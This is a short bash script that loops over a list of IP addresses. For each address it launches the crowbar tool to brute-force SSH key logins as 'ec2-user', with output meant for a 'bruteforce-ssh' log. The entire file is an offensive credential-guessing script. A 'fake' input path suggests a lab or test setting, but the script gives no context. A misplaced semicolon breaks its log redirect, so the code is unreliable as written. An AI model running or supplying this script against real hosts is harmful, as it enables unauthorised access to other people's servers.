#!/bin/bash
filename='/tools/ips.txt'
filelines=`cat $filename`
echo Start
for ip in $filelines ; do
        python /tools/crowbar/crowbar.py -b sshkey -s $ip/32 -u ec2-user -k ./fake/passwords.txt; >> /var/log/bruteforce-ssh &
        echo $ip
done
